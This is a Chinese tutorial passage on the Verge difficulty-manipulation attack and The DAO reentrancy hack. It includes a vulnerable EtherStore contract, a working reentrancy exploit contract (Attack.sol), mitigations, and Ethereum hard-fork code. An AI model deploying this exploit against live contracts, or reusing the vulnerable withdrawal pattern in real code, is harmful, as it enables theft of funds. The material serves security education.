<p>51%攻击我们在双重支付的时候提到过，如果攻击者能够控制51%的算力，那么他们就可以控制产生的区块，在区块中包括双重支付的交易，或者在包括双重支付的交易之后进行延续。但当时我们也分析了，首先，在比特币系统中，在拥有大量的矿工和矿池的情况下，任何人想要控制51%的算力基本是不可能的；其次，如果有人真正控制了51%的算力，那么他会选择遵守和维护这个秩序，从而避免自己的投资浪费掉。</p>
<p>那这个针对Verge的攻击是怎么回事呢？攻击者其实并没有真正掌握51%的算力。</p>
<p>控制51%的算力实际上就是要比别人更快地进行哈希，找出来满足区块产生难度的哈希值。那如果不能在算力上占优，有没有可能降低区块的难度？</p>
<p>在比特币系统中，产生区块的难度是可以动态调节的。难度值被设定在无论节点计算能力如何，新区块产生速率都保持在每10分钟一个。难度的调整是在每个完整节点中独立自动发生的。每2016个区块，所有节点都会按统一的公式自动调整难度。</p>
<p>在Verge系统中，也有类似的机制。Verge希望维持足够的去中心化，也即让个人计算机这样的小型设备能参与计算；但为了防止过快产生区块，Verge规定每隔 30 秒产生一个区块。为了实现这一点，Verge的挖矿难度是根据区块确认速率动态调整的。如果更多的人决定投入更多的算力产生 Verge 区块，那么挖矿速率会变快，Verge 区块链协议将增加挖矿难度，从而限制区块提交速率。相反，随着挖矿算力下降以及区块产生间隔增加，挖矿会变得更加容易。因此，当网络正常运行时，不管外界环境如何，Verge 网络都能够实时处理，并且引导网络达到目标区块产生速率的均衡。从设计目的而言，这个设计毫无疑问是非常人性化的，用户友好的。</p>
<p>Verge 用来计算密码学难题的共识算法是 Dark Gravity Wave，它对 30 分钟内滑动窗口的区块确认速率取加权平均值。这样的后果是，挖矿难度是最近区块产生速率的函数，而基于区块产生频率进行挖矿难度计算自然需要查看区块时间戳。</p>
<p>这里还涉及到一个问题：在区块链系统是，区块时间戳允许乱序。</p>
<p>在区块链协议中，单笔交易被分组打包到一个区块中，作为整体进行确认。每一个区块都有一个其创建日期的时间戳。即使区块链协议正常运行，在某些情况下这些时间戳也可能是乱序的，即，第 100 个区块的时间戳可能<em>晚于</em>第 101 个区块。这是因为，在去中心化系统中，进行时间同步确实是一件很难的事情。即便所有节点都是诚实的，区块的时间戳也绝对有可能出现“乱序”的情况。换句话说，在去中心化系统中，允许乱序才是正常的；在 Verge 被黑客攻击之前，它允许接收的区块时间戳“窗口”至多为2个小时。在Verge攻击之后，这个窗口被缩小到15分钟。</p>
<p>现在，如果有人创建出足够多的错误时间戳，那么就会影响Verge的区块产生速率的判断，从而降低区块的产生难度。在黑客几次攻击的时间里，每隔一个区块的提交时间戳大约比区块加入区块链的时间早一个小时，这就使得协议的挖矿调整算法输出结果惨不忍睹了。如果协议能够流利地讲英语的话，它将会说：“Oh no！Not enough blocks have been submitted recently！Mining must be too difficult——let’s make it easier！”（哦，不！最近提交的区块数量不够！挖矿算法一定是太难了——让我们调整的简单一些吧！）由于时间戳持续被篡改，协议持续降低挖矿难度，直到挖矿变得非常容易。总的来说，攻击前几个小时的平均难度是 1393093.39131，在攻击期间它的难度降低到 0.00024414，难度降低了超过 99.999999%。更低的挖款难度意味着能够提交更多的区块——在这种情况下，大约每秒产生一个区块。</p>
<p>如果仅仅是这样的话，攻击者并没有捞到什么好处，因为，如果系统调低了产生区块的难度，那么所有矿工的难度都降低了，攻击者还是需要和其他人进行竞争。这时，就需要利用Verge的另一个特点——Verge 使用了五种算法是 Scrypt，X17，Lyra2rev2，myrgroestl 以及 blake2s作为工作量证明的算法。（作为对比，比特币是SHA256）</p>
<p>Verge做出这个决定的出发点也是非常好的。因为，随着时间推移，比特币矿场变得过于专业化和中心化，例如，比特币大部分区块都是由 Bitcoin ASIC 矿机（这种矿机专门设计用于挖比特币）产生，并且许多比特币是由少数矿池挖出来的。Verge开发者认为，如果使用5中不同的算法，任何人想要同时控制5种算法， 使用5中专用硬件，难度应该会高于只用一种算法，从而促进 Verge 挖矿经济朝着更分布式、去中心化的方向发展。</p>
<p>这样，保证系统正常运行的方法是，每个算法都有<em>自己</em>的挖矿难度参数，并且独立于其余四个算法进行调整，这意味着，Scrypt 的挖矿难度将调整到每30秒产生一个区块，X17 及其他三种算法亦然。从而整个 Verge 网络才能保证每 30 秒产生一个区块、保持全部五种算法的收益对于矿工来说都是均衡的，并确保没有一种算法占优势地位。</p>
<p>这意味着伪造的时间戳并没有降低整个网络挖矿难度，而仅仅只是降低了五个算法中的 Scrypt的挖矿难度。因此，当 Scrypt 矿工的挖矿难度很低时，其他四种算法的矿工依旧得像之前一样努力工作，那么它们的哈希算力对于维护网络安全就没用了。更重要的是，攻击者仅需要使用 Scrypt 算法挖矿，并且仅需要与也使用 Srypt 挖矿的人竞争。因此，攻击者控制网络所需的哈希算力从当初的超过50%（在整个网络中占多数），下降到仅需超过10%（在 Scrypt 矿工中占多数），而Reddit 论坛上有人粗略地估计，这个数字甚至<a href="https://link.zhihu.com/?target=https://www.reddit.com/r/CryptoCurrency/comments/8a2b99/verge_xvg_mining_exploit_attack_megathread/">低至0.4%</a>。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233088.jpg" alt="img">使用scrypt算法产生的区块</p>
<p>在攻击产生后，Verge的股价产生了波动。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233089.jpg" alt="img">攻击发生后，股价下跌</p>
<p>下图是5月的第二次攻击后产生的；据说第一次攻击后一周，反而上涨了…..</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233090.jpg" alt="img">一个月之间，跌了20%</p>
<p>应该来说，从中应该得到的教训是：当涉及用户金融资产时，应更倾向于事实证明更行之有效的方法，并防止事情变得过于复杂，从而带来不必要的风险。</p>
<h2 id="THE-DAO攻击"><a href="#THE-DAO攻击" class="headerlink" title="THE DAO攻击"></a>THE DAO攻击</h2><p>在区块链技术领域，The DAO攻击中，面对黑客当着面利用漏洞源源不断从1.5亿美金的以太币池中拿走资金，而且还没办法。</p>
<p>The DAO项目是区块链物联网公司Slock.it发起的一个众筹项目。THE DAO是一个分散自治的组织(Decentralized Autonomous Organization),它的目标是编写一个组织的规则和决策机构，消除对文件和人员治理的需求，建立一个分散控制的结构。DAO是区块链法则里不可少的一环，而the DAO含义为“DAO之母”，是建立在以太坊上的一个应用，功能类似于投资机构。参与者可以使用以太币来换取DAO，也就是the DAO的token，持有DAO可以对the DAO的投资决策提出自己的意见。</p>
<p>它的工作流程如下：</p>
<ol>
<li>技术人员编写在组织上运行的智能合约</li>
<li>在初始资金募集期，通过购买代表所有权的token代币来将资金注入到DAO项目中，也即ICO，为项目提供资金（THE DAO众筹约1.5亿美元的资金，是当时最大的众筹项目；远超创建者预期）</li>
<li>ICO之后，DAO开始运作</li>
<li>创业者可以给DAO项目提出议案，拥有TOKEN的成员享有投票权，通过投票决定是否通过议案</li>
</ol>
<p>项目运作特点： </p>
<ol>
<li>通过智能合约来主导以太币资金的分发利用</li>
<li>参与众筹人按照出资金额（比特币等），获得相应DAO代币，即内部token，具有审查及投票表决权利</li>
<li>投资议案由全体代币持有人投票，每个代币一票</li>
<li>项目收益按照一定规则回馈代币持有人</li>
</ol>
<p>The DAO项目于2016年4月30日开始，融资窗口开放了28天。不知出于什么原因，反正The DAO项目就这么火起来了，截止5月15日这个项目筹得了超过一亿美元，而到整个融资期结束，共有超过11,000位热情的成员参与进来，筹得1.5亿美元，成为历史上最大的众筹项目。The DAO所集资的钱远远超过其创建者的预期。</p>
<p>可以说，他们的市场战略比他们职能的执行来的好，因为在众销期间，就有人担心其代码会很容易受到攻击。6月17日发生了黑客攻击事件，事件的根本原因在于一行早已被发现的代码漏洞。 康奈尔大学计算机科学系副教授Emin Gün Sirer在给他的一位学生发邮件时提到他正在研究智能合约第666行代码可能存在的问题，甚至在2016年5月份也呼吁过投资者停止对DAO的投资，因为存在这样的安全漏洞。但是，Gün教授对于代码漏洞无能为力，因为代码发布在以太坊区块链上就无法修改。事实上，发现这行代码漏洞的并不止Gün教授，2016年6月9日，在互联网上出现了与这次黑客攻击相同手法的预警，6月10日智能合约语言Solidity的作者 Christian在以太坊官方博客上发表文章说明这个问题，the DAO团队也接到了安全报告，但做出了不会受到攻击的结论。有一点需要重申，那就是以太坊网络之前没有出现过这种漏洞，并且整个期间一直运作良好。其实所有网络系统都有可能会遭到各种各样的攻击。而支撑价值超过10亿美元（根据市值计算）的以太币的以太坊网络还没有遇到过黑客攻击，而且它同时还在运行很多其他智能合约。6月18日，也就是周六，黑客成功挖到超过360万个以太币，并投入到一个DAO子组织中，这个组织和THE DAO有着同样的结构。当时以太币价格从20多美元直接跌破13美元。</p>
<p>The DAO的智能合约中有一个splitDAO函数，splitDAO的本意是要保护投票中处于弱势地位的少数派防止他们被多数派通过投票的方式合法剥削。通过分裂出一个小规模的DAO，给予他们一个用脚投票的机制，同时仍然确保他们可以获取分裂前进行的对外资助产生的可能收益。</p>
<p>攻击者通过此函数中的漏洞重复利用自己的DAO资产来不断从TheDAO项目的资产池中分离DAO资产给自己。</p>
<p>在DAO.sol中，function splitDAO函数有这样一行：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233091.jpg" alt="img"></p>
<p>然后，withdrawRewardFor的实现如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233092.jpg" alt="img"></p>
<p>再看payOut函数调用。rewardAccount的类型是ManagedAccount，在ManagedAccount.sol中可以看到：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233093.jpg" alt="img"></p>
<p>关于以上代码为何会导致攻击，我们来分析一下。</p>
<p>既然以太币是作为电子货币，那么自然会有交易，也即send()和receive()。以太坊上的编程语言solidity提供了三种方法实现send功能。分别是address.send，address.transfer和address.call.value。</p>
<p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.value()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p>
<p><strong><address>.transfer()</strong></p>
<ul>
<li>当发送失败时会 <code>throw;</code> 回滚状态</li>
<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<p><strong><address>.send()</strong></p>
<ul>
<li>当发送失败时会返回 <code>false</code> 布尔值</li>
<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<p><strong><address>.gas().call.value()()</strong></p>
<ul>
<li>当发送失败时会返回 <code>false</code> 布尔值</li>
<li>传递所有可用 Gas 进行调用（可通过 <code>gas(gas_value)</code> 进行限制），不能有效防止重入（reentrancy）</li>
</ul>
<p>如何理解防止重入呢？基本来说，攻击者要想实现攻击，需要让受害者执行自己的代码。而因为send和transfer都只能使用2300的gas，也即当执行完一小段代码之后，要么成功返回，要么gas耗尽，从而让攻击者所能做的操作相当有限。call.value不存在这个限制。接下来就是要将正常的操作流程导向攻击者的代码。</p>
<p>solidity还提供了一个特性：</p>
<h3 id="回退函数-fallback"><a href="#回退函数-fallback" class="headerlink" title="回退函数 - fallback()"></a>回退函数 - fallback()</h3><p>官方文档：</p>
<blockquote>
<p><strong>A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</strong></p>
</blockquote>
<p>一个合约可以具有一个匿名函数，该函数没有参数也没有返回值。当该合约被调用时找不到匹配的函数名，或者说被调用时没有提供参数，那么就调用fallback 函数。</p>
<blockquote>
<p>pragma solidity ^0.4.0;</p>
<p>contract SimpleFallback{<br><strong>function</strong>(){<br><em>&#x2F;&#x2F;fallback function</em><br>}<br>}</p>
</blockquote>
<p>另外，当使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数。在这种情况下，一定要定义fallback函数，并且fallback函数还必须使用Payable修饰，否则send会报错。正是因为如此，所以对send函数做了一定的限制，gas只能使用2300。这样，下述行为消耗的gas都将超过fallback函数限定的gas值：</p>
<ul>
<li>向区块链中写数据</li>
<li>创建一个合约</li>
<li>调用一个external的函数</li>
<li>发送ether</li>
</ul>
<p>所以一般，我们只能在fallback函数中进行一些日志操作：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract FallbackFailOnGasLimit&#123;</span><br><span class="line">  uint someStorage;</span><br><span class="line"></span><br><span class="line">  event fallbackTrigged(bytes);</span><br><span class="line">  function() payable&#123;</span><br><span class="line">    fallbackTrigged(msg.data);</span><br><span class="line">    //将因为写入操作失败，注释掉下面这行，将会执行成功</span><br><span class="line">    someStorage = 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function callFallback() returns (bool)&#123;</span><br><span class="line">    return this.send(0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是对call.value没有2300 gas的限制。如果在调用过程中没有设置gas的值，那么会一直运行直到耗尽所有的gas。也即，如果想要执行恶意代码，多准备点gas就好。</p>
<p>接下来，我们看一个例子。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">EtherStore.sol：</span><br><span class="line"></span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">    mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function depositFunds() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFunds (uint256 _weiToWithdraw) public &#123; </span><br><span class="line">       require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        // limit the withdrawal </span><br><span class="line">       require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">        // limit the time allowed to withdraw</span><br><span class="line">        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks); </span><br><span class="line">       require(msg.sender.call.value(_weiToWithdraw)()); </span><br><span class="line">       balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>以上代码就是被攻击代码。它的功能是充当公共账户，类似于银行，接收用户存款（depositFund），提供用户取现功能（withdrawFunds）。</p>
<p>depositFund中，简单增加用户账户的余额，在用户取现的时候，首先做检查，确保用户账户的余额超出所要提取的金额，然后检查取现金额的最大值；接下来再对取现的时间进行限制，确保一周支取一次。然后将钱转给调用者账户，随后修改调用者msg.send的余额，并更新最新的取现时间。</p>
<p>这段合约的漏洞就在于：require(msg.sender.call.value(_weiToWithdraw)());</p>
<p>当被攻击代码执行到这一句的时候，它会调用msg.send代码中的fallback函数。如果是正常的fallback函数，譬如写日志，那没有任何问题；但是如果是攻击者精心准备的恶意代码，会有各种效果。</p>
<p>譬如，下面一段攻击代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Attack.sol：</span><br><span class="line"></span><br><span class="line">import &quot;EtherStore.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"> EtherStore public etherStore;</span><br><span class="line"></span><br><span class="line">  // intialise the etherStore variable with the contract address</span><br><span class="line"> constructor(address _etherStoreAddress) &#123;</span><br><span class="line">     etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function pwnEtherStore() public payable &#123;</span><br><span class="line">      // attack to the nearest ether</span><br><span class="line">     require(msg.value &gt;= 1 ether); </span><br><span class="line">     // send eth to the depositFunds() function</span><br><span class="line">     etherStore.depositFunds.value(1 ether)();</span><br><span class="line">      // start the magic</span><br><span class="line">     etherStore.withdrawFunds(1 ether);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function collectEther() public &#123;</span><br><span class="line">     msg.sender.transfer(this.balance);</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"> // fallback function - where the magic happens</span><br><span class="line"> function () payable &#123;</span><br><span class="line">      if (etherStore.balance &gt; 1 ether) &#123;</span><br><span class="line">         etherStore.withdrawFunds(1 ether);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击者首先准备好 etherStore变量，并将作为被攻击代码的地址作为参数传入。</p>
<p>etherStore &#x3D; EtherStore(_etherStoreAddress);</p>
<p>攻击者准备好pwnEtherStore()，这个函数首先向被攻击合约中存入一定以太币，假设是1以太币（因为EtherStore.sol要求取现是账户里有一定余额）。</p>
<p>etherStore.depositFunds.value(1 ether)()</p>
<p>然后进行取现，调用 etherStore.withdrawFunds(1 ether);</p>
<p>因为withdraw函数中使用了call.value()，根据solidity的规范，fallback函数将在Attack合约收到Ether（不带data）时自动执行。此fallback函数将通过递归触发对THE DAO的splitDAO函数的多次调用所以会调用攻击者合约中的匿名函数，而在攻击者的匿名函数中，又再次调用</p>
<p>etherStore.withdrawFunds(1 ether)。</p>
<p>因为受害者的代码中withdrawFunds在call.value之后才修改攻击者的余额，而call.value触发fallback，再次执行withdraw，所以相当于攻击者的余额一直没有机会被修改。这样，只要攻击者的gas足够多，它会一直将公共账户也即Bank里的钱全部移走。</p>
<p>因为攻击者的代码使得受害者合约一遍遍地重新执行攻击代码，所以也叫“重入”攻击。</p>
<p><strong>防御措施：</strong></p>
<p>从代码看，本次攻击得以成功的因素有二：一是dao余额扣减和Ether转账这两步操作的顺序有误，二是不受限制地执行未知代码。</p>
<p>应用代码顺序方面，应先扣减dao的余额再转账Ether，因为dao的余额检查作为转账Ether的先决条件，要求dao的余额状况必须能够及时反映最新状况。在问题代码实现中，尽管最深的递归返回并成功扣减黑客的dao余额，但此时对黑客dao余额的扣减已经无济于事，因为其上各层递归调用中余额检查都已成功告终，已经不会再有机会判断最新余额了。</p>
<p>不受限制地执行未知代码方面，虽然黑客当前是利用了solidity提供的匿名fallback函数，但这种对未知代码的执行原则上可以发生在更多场景下，因为合约之间的消息传递完全类似于面向对象程序开发中的方法调用，而提供接口等待回调是设计模式中常见的手法，所以完全有可能执行一个未知的普通函数。</p>
<p>本次漏洞属于应用层面，并不是以太坊本身的问题，甚至都不能归咎于“图灵完备”，因为这种攻击即使在一个非图灵完备的平台上也可以奏效。总的来说，应用越复杂，应用出现安全问题的概率就越高。</p>
<p>有许多常用技术可以帮助避免智能合约中潜在的重入漏洞：</p>
<ol>
<li>在将 Ether 发送给外部合约时使用内置的 transfer() 函数 。transfer转账功能只发送 2300 gas 不足以使目的地址&#x2F;合约调用另一份合约（即重入发送合约）。</li>
<li>确保所有改变状态变量的逻辑发生在 Ether 被发送出合约（或任何外部调用）之前。在这个 EtherStore 例子中，EtherStore.sol 中对账户余额和账户时间的修改应该在发送以太币之前。将任何对未知地址执行外部调用的代码，放置在本地化函数或代码执行中作为最后一个操作，是一种很好的做法。这被称为 <a href="https://link.zhihu.com/?target=http://solidity.readthedocs.io/en/latest/security-considerations.html%23use-the-checks-effects-interactions-pattern">检查效果交互（checks-effects-interactions）</a> 模式。</li>
<li>引入互斥锁。也就是说，要添加一个在代码执行过程中锁定合约的状态变量，阻止重入调用；这样在本次发送–修改余额这一整套操作完成之前，不能再次执行发送操作。</li>
</ol>
<p>譬如修改代码如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">// initialise the mutex</span><br><span class="line">bool reEntrancyMutex = false;</span><br><span class="line">uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">function depositFunds() public payable &#123;</span><br><span class="line">    balances[msg.sender] += msg.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    require(!reEntrancyMutex);</span><br><span class="line">    require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">    // limit the withdrawal</span><br><span class="line">    require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">    // limit the time allowed to withdraw</span><br><span class="line">    require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);</span><br><span class="line">    balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    lastWithdrawTime[msg.sender] = now; </span><br><span class="line">   // set the reEntrancy mutex before the external call</span><br><span class="line">    reEntrancyMutex = true; </span><br><span class="line">   msg.sender.transfer(_weiToWithdraw);</span><br><span class="line">    // release the mutex after the external call </span><br><span class="line">   reEntrancyMutex = false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用reEntrancyMutex可以保证代码不可重入。类似于多线程的互斥锁。</p>
<p>THE DAO攻击后续：</p>
<p>THE DAO 创始人之一 Stephan TualTual 在 6 月 12 日宣布，他们发现了软件中存在的 “递归调用漏洞” 问题。 不幸的是，在程序员修复这一漏洞及其他问题的期间，一个不知名的黑客开始利用这一途径收集 THE DAO 代币销售中所得的以太币。6 月 18 日，黑客成功挖到超过 360 万个以太币，并投入到一个 DAO 子组织中，这个组织和 THE DAO 有着同样的结构。因为THE DAO 持有近 15% 的以太币总数，因此 THE DAO 这次的问题对以太坊网络及其加密币都产生了负面影响。</p>
<p>6 月 17 日，以太坊基金会的 Vitalik Buterin在以太坊官方博客发布题为［紧急状态更新：关于the DAO的漏洞］的文章，他表示，DAO 正在遭到攻击，不过他已经研究出了解决方案：</p>
<blockquote>
<p>现在提出了软件分叉解决方案，通过这种软件分叉，任何调用代码或委托调用的交易 —— 借助代码 hash0x7278d050619a624f84f51987149ddb439cdaadfba5966f7cfaea7ad44340a4ba（也就是 DAO 和子 DAO）来减少账户余额 —— 都会视为无效……</p>
</blockquote>
<p>最终因为社交的不同意见，最终以太坊分裂出支持继续维持原状的以太经典 ETC，同意软件分叉解决方案的在以太坊当前网络实施。</p>
<p>【疑似】攻击者通过一个中介表示，他会暂停这个有组织的对他财产的“盗窃”，他会奖励不支持这项软分叉提议的矿工（节点），他说：</p>
<blockquote>
<p>“很快我们就会有一个智能合约来奖励矿工，奖励那些反对软分叉并进行挖矿的人。共计100万个以太币，以及100个比特币会分享给矿工。”</p>
</blockquote>
<p>V神的解决方案实际上就是产生分叉，让黑客的操作无效。软分叉将从块高度1760000开始把任何与the DAO和child DAO相关的交易认做无效交易，以此阻止攻击者在27天之后提现被盗 的以太币。这之后会有一次硬分叉将以太币找回。</p>
<p>以下内容来自于参考文献11：</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h3><p>因为投资者已经将以太币投入了 The DAO 合约或者其子合约中，在攻击后无法立刻撤回。<br>需要让投资者快速撤回投资，且能封锁黑客转移资产。</p>
<p>V 神公布的解决方案是，在程序中植入转移合约以太币代码，让矿工选择是否支持分叉。在分叉点到达时则将 The DAO 和其子合约中的以太币转移到一个新的安全的可取款合约中。全部转移后，原投资者则可以直接从取款合约中快速的拿回以太币。取款合约在讨论方案时，已经部署到主网。合约地址是 <a href="https://link.zhihu.com/?target=https://%5Betherscan%5D(https//learnblockchain.cn/docs/etherscan/">0xbf4ed7b27f1d666546e30d74d50d173d20bca754</a>.io&#x2F;address&#x2F;0xbf4ed7b27f1d666546e30d74d50d173d20bca754)。</p>
<p>取款合约代码如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// Deployed on mainnet at 0xbf4ed7b27f1d666546e30d74d50d173d20bca754</span><br><span class="line"></span><br><span class="line">contract DAO &#123;</span><br><span class="line">    function balanceOf(address addr) returns (uint);</span><br><span class="line">    function transferFrom(address from, address to, uint balance) returns (bool);</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WithdrawDAO &#123;</span><br><span class="line">    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);</span><br><span class="line">    address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526;</span><br><span class="line"></span><br><span class="line">    function withdraw()&#123;</span><br><span class="line">        uint balance = mainDAO.balanceOf(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))</span><br><span class="line">            throw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trusteeWithdraw() &#123;</span><br><span class="line">        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，为照顾两个阵营，软件提供硬分叉开关，选择权则交给社区。支持分叉的矿工会在 X 区块到 X+9 区块出块时，在区块 <code>extradata</code> 字段中写入 <code>0x64616f2d686172642d666f726b</code>（“dao-hard-fork” 的十六进制数）。从分叉点开始，如果连续 10 个区块均有硬分叉投票，则表示硬分叉成功。</p>
<h3 id="矿工投票与区块头校验"><a href="#矿工投票与区块头校验" class="headerlink" title="矿工投票与区块头校验"></a><strong>矿工投票与区块头校验</strong></h3><p>首先，选择权交给社区。因此是否同意硬分叉，可通过参数进行选择。但是在当前版本中，社区已完成硬分叉，所以已移除开关类代码。</p>
<p>当前，主网已默认配置支持 DAO 分叉，并设定了开始硬分叉高度 1920000，代码如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// params/config.go:38</span><br><span class="line">MainnetChainConfig = &amp;ChainConfig&#123; </span><br><span class="line">		DAOForkBlock:        big.NewInt(1920000),</span><br><span class="line">		DAOForkSupport:      true, </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>如果矿工支持分叉，则需要在从高度 192000 到 192009，在区块头 <code>extradata</code> 写入指定信息 0x64616f2d686172642d666f726b ，以表示支持硬分叉。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">//params/dao.go:28</span><br><span class="line">var DAOForkBlockExtra = common.FromHex(&quot;0x64616f2d686172642d666f726b&quot;)</span><br><span class="line"></span><br><span class="line">// params/dao.go:32</span><br><span class="line">var DAOForkExtraRange = big.NewInt(10)</span><br></pre></td></tr></table></figure>

<p>支持硬分叉时矿工写入固定的投票信息：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// miner/worker.go:857</span><br><span class="line">if daoBlock := w.config.DAOForkBlock; daoBlock != nil &#123; </span><br><span class="line">    // 检查是否区块是否仍然属于分叉处理期间：[DAOForkBlock,DAOForkBlock+10)</span><br><span class="line">    limit := new(big.Int).Add(daoBlock, params.DAOForkExtraRange)</span><br><span class="line">    if header.Number.Cmp(daoBlock) &gt;= 0 &amp;&amp; header.Number.Cmp(limit) &lt; 0 &#123;</span><br><span class="line">        // 如果支持分叉，则覆盖Extra，写入保留的投票信息</span><br><span class="line">        if w.config.DAOForkSupport &#123;</span><br><span class="line">        header.Extra = common.CopyBytes(params.DAOForkBlockExtra)</span><br><span class="line">        &#125; else if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;</span><br><span class="line">            // 如果矿工反对，则不能让其使用保留信息，覆盖它。</span><br><span class="line">        header.Extra = []byte&#123;&#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要连续 10 个区块的原因是为了防止矿工使用保留信息污染非分叉块和方便轻节点安全同步数据。<br>同时，所有节点在校验区块头时，必须安全地校验特殊字段信息，校验区块是否属于正确的分叉上。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// consensus/ethash/consensus.go:294 </span><br><span class="line">if err := misc.VerifyDAOHeaderExtraData(chain.Config(), header); err != nil &#123; //❶</span><br><span class="line">	return err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// consensus/misc/dao.go:47 </span><br><span class="line">func VerifyDAOHeaderExtraData(config *params.ChainConfig, header *types.Header) error &#123; </span><br><span class="line">	if config.DAOForkBlock == nil &#123;//❷</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	limit := new(big.Int).Add(config.DAOForkBlock, params.DAOForkExtraRange) //❸</span><br><span class="line">	if header.Number.Cmp(config.DAOForkBlock) &lt; 0 || header.Number.Cmp(limit) &gt;= 0 &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	if config.DAOForkSupport &#123;</span><br><span class="line">		if !bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123; //❹</span><br><span class="line">			return ErrBadProDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;//❺</span><br><span class="line">			return ErrBadNoDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	// All ok, header has the same extra-data we expect</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>❶ 在校验区块头时增加 DAO 区块头识别校验。</li>
<li>❷ 如果节点未设置分叉点，则不校验。</li>
<li>❸ 确保只需在 DAO 分叉点的 10 个区块上校验。</li>
<li>❹ 如果节点允许分叉，则要求区块头 Extra 必须符合要求。</li>
<li>❺ 当然，如果节点不允许分叉，则也不能在区块头中加入非分叉链的 Extra 特殊信息。</li>
</ul>
